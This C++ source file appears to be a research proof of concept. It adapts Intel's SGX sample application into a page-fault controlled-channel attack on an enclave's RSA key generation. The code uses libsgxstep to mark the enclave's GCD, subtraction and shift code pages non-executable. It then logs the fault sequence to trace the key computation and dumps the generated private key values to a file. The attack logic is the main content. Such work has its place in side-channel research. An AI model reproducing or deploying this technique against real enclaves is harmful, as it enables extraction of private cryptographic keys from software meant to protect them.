/*
 * Copyright (C) 2011-2018 Intel Corporation. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 *   * Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *   * Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in
 *     the documentation and/or other materials provided with the
 *     distribution.
 *   * Neither the name of Intel Corporation nor the names of its
 *     contributors may be used to endorse or promote products derived
 *     from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */


#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <signal.h>
#include <unistd.h>
#include <pwd.h>
#define MAX_PATH FILENAME_MAX
#include <openssl/rsa.h>

extern "C" {
#include <libsgxstep/sched.h>
#include <libsgxstep/debug.h>
#include <libsgxstep/pt.h>
#include <libsgxstep/enclave.h>
}
#include <sgx_urts.h>
#include "App.h"
#include "Enclave_u.h"


FILE *publicFile, *privateFile;

struct sigaction act; // sigaction action variable
static int iterations;
uint64_t *gcdPage;
uint64_t *rShift1Page;
uint64_t *subPage;
uint64_t *prevFaultedPage, *prevToPrevFaultedPage;
static bool firstIteration;

/* Configuring required page-table info */
static uint64_t gcdPageOffset = 0x58800;
static uint64_t subPageOffset = 0x544a0;
static uint64_t rShift1PageOffset = 0x3d210;

/* Global EID shared by multiple threads */
sgx_enclave_id_t global_eid = 0;


typedef struct _sgx_errlist_t {
    sgx_status_t err;
    const char *msg;
    const char *sug; /* Suggestion */
} sgx_errlist_t;

/* Error code returned by sgx_create_enclave */
static sgx_errlist_t sgx_errlist[] = {
    {
        SGX_ERROR_UNEXPECTED,
        "Unexpected error occurred.",
        NULL
    },
    {
        SGX_ERROR_INVALID_PARAMETER,
        "Invalid parameter.",
        NULL
    },
    {
        SGX_ERROR_OUT_OF_MEMORY,
        "Out of memory.",
        NULL
    },
    {
        SGX_ERROR_ENCLAVE_LOST,
        "Power transition occurred.",
        "Please refer to the sample \"PowerTransition\" for details."
    },
    {
        SGX_ERROR_INVALID_ENCLAVE,
        "Invalid enclave image.",
        NULL
    },
    {
        SGX_ERROR_INVALID_ENCLAVE_ID,
        "Invalid enclave identification.",
        NULL
    },
    {
        SGX_ERROR_INVALID_SIGNATURE,
        "Invalid enclave signature.",
        NULL
    },
    {
        SGX_ERROR_OUT_OF_EPC,
        "Out of EPC memory.",
        NULL
    },
    {
        SGX_ERROR_NO_DEVICE,
        "Invalid SGX device.",
        "Please make sure SGX module is enabled in the BIOS, and install SGX driver afterwards."
    },
    {
        SGX_ERROR_MEMORY_MAP_CONFLICT,
        "Memory map conflicted.",
        NULL
    },
    {
        SGX_ERROR_INVALID_METADATA,
        "Invalid enclave metadata.",
        NULL
    },
    {
        SGX_ERROR_DEVICE_BUSY,
        "SGX device was busy.",
        NULL
    },
    {
        SGX_ERROR_INVALID_VERSION,
        "Enclave version was invalid.",
        NULL
    },
    {
        SGX_ERROR_INVALID_ATTRIBUTE,
        "Enclave was not authorized.",
        NULL
    },
    {
        SGX_ERROR_ENCLAVE_FILE_ACCESS,
        "Can't open enclave file.",
        NULL
    },
};

/* Check error conditions for loading enclave */
void print_error_message(sgx_status_t ret)
{
    size_t idx = 0;
    size_t ttl = sizeof sgx_errlist/sizeof sgx_errlist[0];

    for (idx = 0; idx < ttl; idx++) {
        if(ret == sgx_errlist[idx].err) {
            if(NULL != sgx_errlist[idx].sug)
                printf("Info: %s\n", sgx_errlist[idx].sug);
            printf("Error: %s\n", sgx_errlist[idx].msg);
            break;
        }
    }
    
    if (idx == ttl)
    	printf("Error code is 0x%X. Please refer to the \"Intel SGX SDK Developer Reference\" for more details.\n", ret);
}

/* Initialize the enclave:
 *   Call sgx_create_enclave to initialize an enclave instance
 */
int initialize_enclave(void)
{
    sgx_status_t ret = SGX_ERROR_UNEXPECTED;
    
    /* Call sgx_create_enclave to initialize an enclave instance */
    /* Debug Support: set 2nd parameter to 1 */
    ret = sgx_create_enclave(ENCLAVE_FILENAME, SGX_DEBUG_FLAG, NULL, NULL, &global_eid, NULL);
    if (ret != SGX_SUCCESS) {
        print_error_message(ret);
        return -1;
    }

    return 0;
}

/* OCall functions */
void ocall_print_string(const char *str)
{
    /* Proxy/Bridge will check the length and null-terminate 
     * the input string to prevent buffer overflow. 
     */
    printf("%s\n", str);
}

void ocall_print_values(unsigned char* val,int len,char letter)
{
    /* Proxy/Bridge will check the length and null-terminate 
     * the input string to prevent buffer overflow. 
     */
   	printf("%c %d : ",letter, len);
    	for(int i=0;i<len;i++){
    		printf(" %d", val[i]);
		val++;
	}
	printf("\n");
}

void ocall_print_values2(char* val, char letter)
{
    /* Proxy/Bridge will check the length and null-terminate 
     * the input string to prevent buffer overflow. 
     */
   	/*printf("%c : ",letter);
	printf("0x%s\n", val);
	printf("\n");*/
    if(letter == 'e' || letter == 'n')
    {
        fprintf(publicFile, "%c", letter);
        fprintf(publicFile, "%s", ": 0x");
        fprintf(publicFile, "%s", val);
        fprintf(publicFile, "%c", '\n');
    }
    if(letter == 'p' || letter == 'q' || letter == 'd')
    {
	fprintf(privateFile, "%s", "********\n");
        fprintf(privateFile, "%c", letter);
        fprintf(privateFile, "%s", ": 0x");
        fprintf(privateFile, "%s", val);
        fprintf(privateFile, "%c", '\n');
    }
}

static void pageFaultHandler(int signal, siginfo_t * siginfo, void *context)
{
    if(signal!=SIGSEGV)
        return;
    if(!prevFaultedPage || firstIteration)
    {
        firstIteration = false;
//        *subPage = MARK_NON_EXECUTABLE(*subPage);
        *rShift1Page = MARK_NON_EXECUTABLE(*rShift1Page);
    }
    else
    {
        *prevFaultedPage = MARK_NON_EXECUTABLE(*prevFaultedPage);
    }
    uint64_t faultPageIndex = PT_INDEX((uint64_t) siginfo->si_addr);
    if(faultPageIndex == PT_INDEX(gcdPageOffset))
    {
        printf("g\n");
        *gcdPage = MARK_EXECUTABLE(*gcdPage);
	    if(prevFaultedPage == rShift1Page)
    	{
    		iterations++;
    		*subPage = MARK_NON_EXECUTABLE(*subPage);
    	}
	prevToPrevFaultedPage = prevFaultedPage;
    prevFaultedPage = gcdPage;
    }
    else if(faultPageIndex == PT_INDEX(subPageOffset))
    {
        printf("s ");
        *subPage = MARK_EXECUTABLE(*subPage);
        prevFaultedPage = subPage;
    }
    else if(faultPageIndex == PT_INDEX(rShift1PageOffset))
    {
        printf("r ");
        *rShift1Page = MARK_EXECUTABLE(*rShift1Page);
	    prevToPrevFaultedPage = prevFaultedPage;
        prevFaultedPage = rShift1Page;
    }
}

/* Application entry */
int SGX_CDECL main(int argc, char *argv[])
{
    (void)(argc);
    (void)(argv);


    /* Initialize the enclave */
    if(initialize_enclave() < 0){
        printf("Enter a character before exit ...\n");
        getchar();
        return -1; 
    }
 
    /* Utilize edger8r attributes */
    edger8r_array_attributes();
    edger8r_pointer_attributes();
    edger8r_type_attributes();
    edger8r_function_attributes();
    
    /* Utilize trusted libraries */
    ecall_libc_functions();
    ecall_libcxx_functions();
    ecall_thread_functions();

    iterations=0;

    /* Setting up page fault handler*/
    memset(&act, '\0', sizeof(act));
    act.sa_sigaction = &pageFaultHandler;
    act.sa_flags = SA_SIGINFO;
    if(sigaction(SIGSEGV, &act, NULL) !=0)
    {
        printf("Page fault handler code not setup correctly. Terminating!\n");
        sgx_destroy_enclave(global_eid);
        return 0;
    }

    /* Setting up sgx-step */
    register_enclave_info();
    print_enclave_info();
    printf("\n");
    uint64_t enclaveBaseAddr = (uint64_t) get_enclave_base();
    firstIteration = true;  
    

    gcdPage = (uint64_t *)remap_page_table_level((void *)(enclaveBaseAddr | gcdPageOffset)  , PTE);
    subPage = (uint64_t *)remap_page_table_level((void *)(enclaveBaseAddr | subPageOffset)  , PTE);
    rShift1Page = (uint64_t *)remap_page_table_level((void *)(enclaveBaseAddr | rShift1PageOffset)  , PTE);
    *gcdPage = MARK_NON_EXECUTABLE(*gcdPage);
    prevFaultedPage = NULL;
    prevToPrevFaultedPage = NULL;
    
    publicFile = fopen("public_data.txt", "w");
	if (publicFile == NULL)
	{
	    printf("Error opening file!\n");
	    return -1;
	}
    privateFile = fopen("private_data.txt", "w");
	if (privateFile == NULL)
	{
	    printf("Error opening file!\n");
	    return -1;
	}
    
    /* Calling function in victim enclave */
	sgx_status_t status = ecall_generate_RSA_key(global_eid);
	if (status != SGX_SUCCESS)
	{
		printf("Ecall didn't return successfully. Terminating!\n");
        sgx_destroy_enclave(global_eid);
        return 0;
    }

    /* Destroy the enclave */
    sgx_destroy_enclave(global_eid);
    
    fclose(publicFile);
    fclose(privateFile);
    
    return 0;
}

